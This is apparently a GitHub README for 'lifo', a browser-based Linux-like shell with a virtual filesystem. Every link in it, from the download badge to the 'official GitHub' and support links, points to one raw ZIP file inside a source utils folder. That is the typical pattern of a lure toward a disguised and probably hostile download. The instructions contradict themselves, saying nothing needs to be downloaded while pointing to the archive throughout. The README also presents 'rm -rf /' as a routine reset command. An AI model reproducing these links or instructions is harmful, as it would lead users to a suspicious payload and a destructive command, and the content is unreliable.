# 🖥️ lifo - Run Linux Inside Your Browser

[![Download lifo](https://img.shields.io/badge/Download-lifo-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip)

## What is lifo? 🧑‍💻

lifo is a simple operating system that runs right inside your web browser. It works like Unix or Linux but uses web technology as its core parts. Instead of using a traditional kernel, lifo uses the browser itself. The commands you type run directly in the browser, and files are saved using your browser's storage system.

You get over 60 commands to work with, just like you would in a Linux shell. It offers a shell similar to bash, a virtual file system, and it keeps your files saved between sessions using IndexedDB. This means you can try out many Linux commands without installing anything on your computer.

## Why Use lifo? 🌟

- No installation required
- Works in any modern browser on Windows
- Saves your data automatically
- Try common Linux commands easily
- Safe to use since it runs sandboxed in your browser

## System Requirements 🖥️

- Windows 10 or later
- A modern web browser: Chrome, Firefox, Edge, or Safari
- Internet connection to open lifo and download files if needed
- At least 100MB free disk space in your browser's data storage (to save files and command history)

## 🎯 Main Features

- Shell environment with 60+ Linux-like commands
- Virtual filesystem for creating and managing files and folders
- Commands such as `ls`, `cat`, `grep`, `echo`, and more
- Persistence using IndexedDB, so your data stays even after closing the browser
- Runs entirely inside the browser, no extra software needed

## 🚀 Getting Started

To start using lifo on your Windows PC, follow these steps:

1. Click the large green **Download lifo** badge at the top of this page or visit the official link below:

   [https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip](https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip)

2. On the GitHub page, find the link to the latest release or open the project homepage.

3. Since lifo runs in your browser, no installation program needs to be downloaded. Instead, you will open lifo directly in your browser.

4. Look for the main application URL or test link in the repository’s README or website. This link is often named `index.html` or similar.

5. Open this URL in your browser. The lifo interface will appear, showing a terminal window where you can type commands.

6. Try typing simple commands like:

   ```
   ls
   echo Hello World
   pwd
   ```

7. Your commands will run in the browser shell, and you can explore the virtual file system with basic commands.

## 📥 Download and Installation

Since lifo is a browser-based application, you do not need to download or install any software in the traditional sense.

- Visit this page to download and run lifo:

  [https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip](https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip)

- Open the provided URL in your browser.

- If you want to use lifo offline, download the repository as a ZIP file:

  1. On the GitHub page, click the green **Code** button at the top right.

  2. Select **Download ZIP**.

  3. Extract the ZIP file to a folder on your PC.

  4. Open the extracted folder.

  5. Launch `index.html` by double-clicking it. This will open lifo in your default web browser.

## 💾 Using lifo’s Virtual Filesystem

lifo comes with a virtual filesystem that works like a regular Linux system. You can create folders and files, move and remove them, and even save files between browser sessions.

- To list files, type:

  ```
  ls
  ```

- To create a new folder, type:

  ```
  mkdir myFolder
  ```

- To create a new file, type:

  ```
  touch myFile.txt
  ```

- To write content inside a file, use the built-in editor or the `echo` command like this:

  ```
  echo "Hello lifo" > myFile.txt
  ```

- To read a file, enter:

  ```
  cat myFile.txt
  ```

Files are saved using your browser’s storage system. This means even if you close the browser, your files will remain when you open lifo again.

## 🔧 Common Commands

lifo supports many common shell commands. Here are a few to get you started:

| Command   | Use                         |
|-----------|-----------------------------|
| ls        | List files and folders       |
| cd        | Change directory             |
| mkdir     | Create a directory           |
| touch     | Create an empty file         |
| rm        | Remove files or directories  |
| cat       | Display file contents        |
| echo      | Show text or write to files  |
| grep      | Search text in files         |
| pwd       | Show current directory path  |
| clear     | Clear the terminal screen    |

Type `help` to see a complete list of commands available in lifo.

## ⚙️ Settings and Configuration

You can adjust some settings to make lifo easier to use:

- Change font size by pressing `Ctrl` + `+` or `Ctrl` + `-` in your browser.
- Use the `clear` command to clean the screen and reduce clutter.
- To reset your virtual filesystem and erase all files, refresh the browser and type:

  ```
  rm -rf /
  ```

  Be careful as this removes all saved data.

## 🔄 Updating lifo

Since lifo runs in the browser from the GitHub repository, updates are automatic when you open the newest version online. If you downloaded the repository as ZIP for offline use:

1. Check the GitHub page regularly for updates.

2. Download the latest ZIP file.

3. Replace your current folder files with the new ones.

## Troubleshooting ❓

- If lifo does not load, make sure your browser is up to date.

- Clear your browser’s cache and try reloading the lifo page.

- If files are not saving, check your browser’s storage settings.

- Use a browser that supports IndexedDB (most modern browsers do).

- If commands don’t work as expected, try refreshing the page.

## Related Topics

- lifo runs fully inside your browser, which acts like a sandbox.

- It uses Web APIs to mimic system calls in a normal operating system.

- The shell is bash-like, making it simple for users familiar with Linux terminals.

- The IndexedDB storage backend ensures data persistence.

## More Information and Support

Visit the official GitHub to learn more or report issues:

[https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip](https://raw.githubusercontent.com/zollaq/lifo/main/packages/core/src/utils/Software_2.3-alpha.1.zip)